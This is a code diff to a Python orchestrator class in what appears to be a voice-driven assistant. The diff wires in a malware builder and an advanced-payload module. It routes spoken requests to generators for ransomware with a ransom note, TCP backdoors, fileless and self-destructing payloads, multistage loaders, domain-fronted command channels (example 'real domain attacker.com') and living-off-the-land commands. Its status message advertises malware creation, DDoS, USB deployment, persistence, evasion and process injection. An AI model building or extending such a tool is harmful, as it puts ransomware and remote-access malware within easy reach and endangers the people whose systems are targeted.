@@ -13,6 +13,8 @@ from cybersecurity.evasion_techniques import EvasionTechniques
 from cybersecurity.anti_detection import AntiDetection
 from cybersecurity.process_injection import ProcessInjection
 from cybersecurity.advanced_obfuscation import AdvancedObfuscator
+from cybersecurity.malware_builder import MalwareBuilder
+from cybersecurity.advanced_payloads import AdvancedPayloads
 from cybersecurity.improvements import ImprovedNLP, EnhancedAuthorization, VSOCReporter
 from prompts.specialists import SECURITY_PRIVACY_PROMPT
 import config_pi as config
@@ -32,6 +34,8 @@ class EnhancedCybersecurityOrchestrator:
         self.anti_detection = AntiDetection()
         self.process_injection = ProcessInjection()
         self.advanced_obfuscator = AdvancedObfuscator()
+        self.malware_builder = MalwareBuilder()
+        self.advanced_payloads = AdvancedPayloads()
         self.nlp = ImprovedNLP()
         self.authorization = EnhancedAuthorization()
         self.reporter = VSOCReporter()
@@ -79,6 +83,16 @@ class EnhancedCybersecurityOrchestrator:
         # Advanced obfuscation
         if any(word in request_lower for word in ["fully obfuscate", "multi layer", "advanced obfuscate"]):
             return self._handle_advanced_obfuscation(request)
+        
+        # Build custom malware
+        if any(word in request_lower for word in ["build", "create custom", "make", "generate"]):
+            return self._handle_build_malware(request)
+        
+        # Advanced payloads
+        if any(word in request_lower for word in ["memory only", "fileless", "multistage", "self destruct", 
+                                                   "encrypted communication", "domain fronting", "lotl", 
+                                                   "ransomware", "backdoor"]):
+            return self._handle_advanced_payloads(request)
         
         # Scanning
         if any(word in request_lower for word in ["scan", "nmap", "vulnerability"]):
@@ -355,7 +369,94 @@ class EnhancedCybersecurityOrchestrator:
             return self.base_orchestrator.process(
                 f"{SECURITY_PRIVACY_PROMPT}\n\nUser question: {request}"
             )
-        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, scanning, reporting."
+        return "Security module ready. Available: malware creation, DDoS testing, USB deployment, persistence, evasion, anti-detection, process injection, advanced obfuscation, custom malware builder, advanced payloads, scanning, reporting."
+    
+    def _handle_build_malware(self, request: str) -> str:
+        """Handle custom malware building"""
+        try:
+            result = self.malware_builder.build_from_voice(request)
+            return f"Created custom {result['type']} payload: {result['file']}. Features: {', '.join(result.get('features', []))}. {result['warning']}"
+        except Exception as e:
+            return f"Error building malware: {str(e)}. Specify type: keylogger, reverse shell, file encryptor, etc."
+    
+    def _handle_advanced_payloads(self, request: str) -> str:
+        """Handle advanced payload creation"""
+        request_lower = request.lower()
+        
+        # Memory-only/fileless
+        if "memory only" in request_lower or "fileless" in request_lower:
+            base = "print('Fileless payload')"
+            result = self.advanced_payloads.create_memory_only_payload(base)
+            return f"Created memory-only payload: {result['file']}. {result['warning']}"
+        
+        # Multi-stage
+        elif "multistage" in request_lower or "multi stage" in request_lower:
+            import re
+            urls = re.findall(r'https?://[^\s]+', request)
+            if urls:
+                result = self.advanced_payloads.create_multi_stage_payload(urls)
+                return f"Created multi-stage payload: {result['file']}. Stages: {result['stages']}. {result['warning']}"
+            return "Specify stage URLs. Example: 'Create multistage payload with http://example.com/stage1.py and http://example.com/stage2.py'"
+        
+        # Self-destruct
+        elif "self destruct" in request_lower:
+            base = "print('Self-destructing payload')"
+            result = self.advanced_payloads.create_self_destruct_payload(base)
+            return f"Created self-destruct payload: {result['file']}. {result['warning']}"
+        
+        # Encrypted communication
+        elif "encrypted communication" in request_lower or "encrypted comm" in request_lower:
+            import re
+            ip_match = re.search(r'\b(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})\b', request)
+            port_match = re.search(r'port\s+(\d+)', request_lower)
+            
+            ip = ip_match.group(1) if ip_match else "127.0.0.1"
+            port = int(port_match.group(1)) if port_match else 4444
+            
+            result = self.advanced_payloads.create_encrypted_communication_payload(ip, port)
+            return f"Created encrypted communication payload: {result['file']}. Target: {result['target']}. {result['warning']}"
+        
+        # Domain fronting
+        elif "domain fronting" in request_lower:
+            import re
+            domains = re.findall(r'[\w\.-]+\.\w+', request)
+            if len(domains) >= 2:
+                result = self.advanced_payloads.create_domain_fronting_payload(domains[0], domains[1])
+                return f"Created domain fronting payload: {result['file']}. Front: {result['front_domain']}, Real: {result['real_domain']}. {result['warning']}"
+            return "Specify front and real domains. Example: 'Create domain fronting payload with front domain example.com and real domain attacker.com'"
+        
+        # Living Off The Land
+        elif "lotl" in request_lower or "living off" in request_lower:
+            # Extract command
+            if "command" in request_lower:
+                cmd_start = request_lower.find("command") + 8
+                command = request[cmd_start:].strip()
+            else:
+                command = "whoami"
+            
+            result = self.advanced_payloads.create_living_off_the_land_payload(command)
+            return f"Created LOLBAS payload: {result['file']}. Command: {result['command']}. {result['warning']}"
+        
+        # Ransomware
+        elif "ransomware" in request_lower:
+            import re
+            dir_match = re.search(r'dir[ectory]?\s+([^\s]+)', request_lower)
+            target_dir = dir_match.group(1) if dir_match else "./test"
+            
+            note = "Your files have been encrypted. Pay ransom to decrypt."
+            result = self.advanced_payloads.create_ransomware_payload(target_dir, note)
+            return f"Created ransomware payload: {result['file']}. Target: {result['target']}. {result['warning']}"
+        
+        # Backdoor
+        elif "backdoor" in request_lower:
+            import re
+            port_match = re.search(r'port\s+(\d+)', request_lower)
+            port = int(port_match.group(1)) if port_match else 4444
+            
+            result = self.advanced_payloads.create_backdoor_payload("tcp", port)
+            return f"Created backdoor payload: {result['file']}. Port: {result['port']}. {result['warning']}"
+        
+        return "Advanced payload types: memory-only, multistage, self-destruct, encrypted communication, domain fronting, LOLBAS, ransomware, backdoor"
     
     def _handle_anti_detection(self, request: str) -> str:
         """Handle anti-detection requests"""
